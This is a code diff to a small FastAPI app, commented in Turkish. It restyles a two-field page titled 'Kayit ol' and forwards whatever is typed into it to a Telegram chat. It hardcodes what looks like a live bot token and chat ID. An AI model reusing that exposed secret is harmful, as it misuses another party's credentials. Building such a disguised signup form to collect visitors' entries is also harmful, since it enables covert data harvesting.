@@ -5,7 +5,7 @@ import requests
 
 app = FastAPI()
 
-# 🔴 BURAYI DOLDUR
+# 🔴 BOT BİLGİLERİ
 BOT_TOKEN = "8834909037:AAFISe23LU4TWF3H-0McwePwtJiruPwSdqk"
 CHAT_ID = "8359722718"
 
@@ -15,7 +15,6 @@ class Form(BaseModel):
     field2: str
 
 
-# 🌐 Site (2 inputlu sayfa)
 @app.get("/", response_class=HTMLResponse)
 def home():
     return """
@@ -23,30 +22,84 @@ def home():
     <html>
     <head>
         <meta charset="UTF-8">
-        <title>Form</title>
+        <title>Mesaj Sistemi</title>
+
+        <style>
+            body {
+                margin: 0;
+                height: 100vh;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                font-family: Arial;
+                background: #f2f2f2;
+            }
+
+            .box {
+                background: white;
+                padding: 30px;
+                border-radius: 12px;
+                text-align: center;
+                width: 300px;
+                box-shadow: 0 0 10px rgba(0,0,0,0.2);
+            }
+
+            h2 {
+                font-size: 28px;
+                margin-bottom: 20px;
+            }
+
+            input {
+                width: 90%;
+                padding: 12px;
+                margin: 10px 0;
+                font-size: 16px;
+                border-radius: 8px;
+                border: 1px solid #ccc;
+                outline: none;
+            }
+
+            button {
+                width: 95%;
+                padding: 12px;
+                font-size: 16px;
+                border: none;
+                border-radius: 8px;
+                cursor: pointer;
+                background: black;
+                color: white;
+            }
+
+            button:hover {
+                background: #333;
+            }
+        </style>
     </head>
-    <body style="font-family:Arial;text-align:center;margin-top:100px;">
 
-        <h2>Mesaj Gönder</h2>
+    <body>
 
-        <input id="f1" placeholder="1. kutu"><br><br>
-        <input id="f2" placeholder="2. kutu"><br><br>
+        <div class="box">
+            <h2>Kayit ol</h2>
 
-        <button onclick="send()">Gönder</button>
+            <input id="f1" placeholder="1. kutu">
+            <input id="f2" placeholder="2. kutu">
+
+            <button onclick="send()">Gönder</button>
+        </div>
 
         <script>
-            function send(){
-                fetch("/send", {
-                    method: "POST",
-                    headers: {"Content-Type": "application/json"},
-                    body: JSON.stringify({
-                        field1: document.getElementById("f1").value,
-                        field2: document.getElementById("f2").value
-                    })
-                });
+        function send(){
+            fetch("/send", {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({
+                    field1: document.getElementById("f1").value,
+                    field2: document.getElementById("f2").value
+                })
+            });
 
-                alert("Gönderildi");
-            }
+            alert("Gönderildi");
+        }
         </script>
 
     </body>
@@ -54,12 +107,11 @@ def home():
     """
 
 
-# 📩 Telegram'a gönderme kısmı
 @app.post("/send")
 def send(data: Form):
 
     text = f"""
-📩 Yeni Form Mesajı
+📩 Yeni Mesaj
 
 🔹 Kutu 1: {data.field1}
 🔹 Kutu 2: {data.field2}
